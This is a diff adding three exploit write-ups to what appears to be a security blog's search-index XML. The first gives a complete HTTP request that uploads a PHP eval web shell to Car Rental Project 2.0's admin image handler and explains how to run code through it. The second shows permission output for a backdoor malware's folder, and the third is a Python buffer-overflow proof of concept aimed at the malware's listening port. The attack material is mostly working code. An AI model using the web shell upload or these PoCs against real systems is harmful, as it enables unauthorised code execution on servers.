@@ -4,6 +4,75 @@
   
     
     <entry>
+      <title>Car Rental Project 2.0 Shell Upload</title>
+      <link href="2021/02/05/Car-Rental-Project-2-0-Shell-Upload/"/>
+      <url>2021/02/05/Car-Rental-Project-2-0-Shell-Upload/</url>
+      
+        <content type="html"><![CDATA[<hr><h4 id="Car-Rental-Project-2-0-Shell-Upload"><a href="#Car-Rental-Project-2-0-Shell-Upload" class="headerlink" title="Car Rental Project 2.0 Shell Upload"></a>Car Rental Project 2.0 Shell Upload</h4><p>Car Rental Project version 2.0 suffers from a remote shell upload vulnerability.</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/carrental/admin/changeimage1.php?imgid=4</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------346751171915680139113101061568<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>369<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/carrental/admin/changeimage1.php?imgid=4<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=te82lj6tvep7afns0qm890393e<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br>-----------------------------346751171915680139113101061568<br>Content-Disposition: form-data; name=&quot;img1&quot;; filename=&quot;1.php&quot;<br>Content-Type: application/octet-stream<br><br>&lt;?php @eval($_POST[pp]);?&gt;<br>-----------------------------346751171915680139113101061568<br>Content-Disposition: form-data; name=&quot;update&quot;<br><br><br>-----------------------------346751171915680139113101061568--<br><br><br><br># Uploaded Malicious File can be Found in :<br>carrental\admin\img\vehicleimages\1.php<br># go to http://localhost/carrental/admin/img/vehicleimages/1.php,Execute malicious code via post value phpinfo();<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Shell Upload </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Backdoor.Win32.RemoteManipulator.brr Insecure Permissions</title>
+      <link href="2021/02/05/Backdoor-Win32-RemoteManipulator-brr-Insecure-Permissions/"/>
+      <url>2021/02/05/Backdoor-Win32-RemoteManipulator-brr-Insecure-Permissions/</url>
+      
+        <content type="html"><![CDATA[<hr><h4 id="Backdoor-Win32-RemoteManipulator-brr-Insecure-Permissions"><a href="#Backdoor-Win32-RemoteManipulator-brr-Insecure-Permissions" class="headerlink" title="Backdoor.Win32.RemoteManipulator.brr Insecure Permissions"></a>Backdoor.Win32.RemoteManipulator.brr Insecure Permissions</h4><p>Backdoor.Win32.RemoteManipulator.brr malware suffers from an insecure permissions vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\&gt;cacls C:\eaKVB<span class="hljs-number">87</span>.tmp<br><span class="hljs-attribute">C</span>:\eaKVB<span class="hljs-number">87</span>.tmp BUILTIN\Administrators:(OI)(CI)(ID)F<br>               <span class="hljs-attribute">NT</span> AUTHORITY\SYSTEM:(OI)(CI)(ID)F<br>               <span class="hljs-attribute">BUILTIN</span>\Users:(OI)(CI)(ID)R<br>               <span class="hljs-attribute">NT</span> AUTHORITY\Authenticated Users:(ID)C<br>               <span class="hljs-attribute">NT</span> AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C<br><br><br><br><span class="hljs-attribute">C</span>:\&gt;cacls C:\eaKVB<span class="hljs-number">87</span>.tmp\taskhosteo.exe<br><span class="hljs-attribute">C</span>:\eaKVB<span class="hljs-number">87</span>.tmp\taskhosteo.exe BUILTIN\Administrators:(ID)F<br>                              <span class="hljs-attribute">NT</span> AUTHORITY\SYSTEM:(ID)F<br>                              <span class="hljs-attribute">BUILTIN</span>\Users:(ID)R<br>                              <span class="hljs-attribute">NT</span> AUTHORITY\Authenticated Users:(ID)C<br><br><span class="hljs-attribute">Directory</span> of c:\eaKVB<span class="hljs-number">87</span>.tmp<br><br><span class="hljs-attribute">03</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">01</span>:<span class="hljs-number">38</span> AM            <span class="hljs-number">42</span>,<span class="hljs-number">320</span> citoCavb.vbs<br><span class="hljs-attribute">01</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">08</span>:<span class="hljs-number">36</span> PM                 <span class="hljs-number">0</span> N<span class="hljs-number">0731337</span>.bak<br><span class="hljs-attribute">03</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">08</span>:<span class="hljs-number">11</span> PM         <span class="hljs-number">3</span>,<span class="hljs-number">968</span>,<span class="hljs-number">512</span> taskhosteo.exe<br><span class="hljs-attribute">09</span>/<span class="hljs-number">01</span>/<span class="hljs-number">2016</span>  <span class="hljs-number">07</span>:<span class="hljs-number">44</span> AM         <span class="hljs-number">1</span>,<span class="hljs-number">639</span>,<span class="hljs-number">336</span> vp<span class="hljs-number">8</span>encoder.dll<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Exploit </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Insecure Permissions </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="2021/02/05/Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow/"/>
+      <url>2021/02/05/Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow/</url>
+      
+        <content type="html"><![CDATA[<hr><h4 id="Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow"><a href="#Backdoor-Win32-NetBull-11-b-Remote-Buffer-Overflow" class="headerlink" title="Backdoor.Win32.NetBull.11.b Remote Buffer Overflow"></a>Backdoor.Win32.NetBull.11.b Remote Buffer Overflow</h4><p>Backdoor.Win32.NetBull.11.b malware suffers from a remote buffer overflow vulnerability.</p><p>Exploit/PoC:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *<br><br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span><br>PORT=<span class="hljs-number">23456</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">doit</span>():</span><br>    s=socket(AF_INET, SOCK_STREAM)<br>    s.connect((MALWARE_HOST, PORT))<br><br>    PACKOLA = <span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">666</span><br>    s.send(PACKOLA)<br>    s.close()<br><br>    print(<span class="hljs-string">&quot;Backdoor.Win32.NetBull.11.b / Remote Buffer Overflow&quot;</span>);<br>    print(<span class="hljs-string">&quot;MD5: 0e0fc966862971c29edd4dcaa0ba8e86&quot;</span>);<br>    print(<span class="hljs-string">&quot;By Malvuln&quot;</span>);<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    doit()<br></code></pre></div></td></tr></table></figure>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> Remote Stack </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Metasploit Module Program Note - http_version</title>
       <link href="2021/01/31/Metasploit-Module-Program-Note-http-version/"/>
       <url>2021/01/31/Metasploit-Module-Program-Note-http-version/</url>
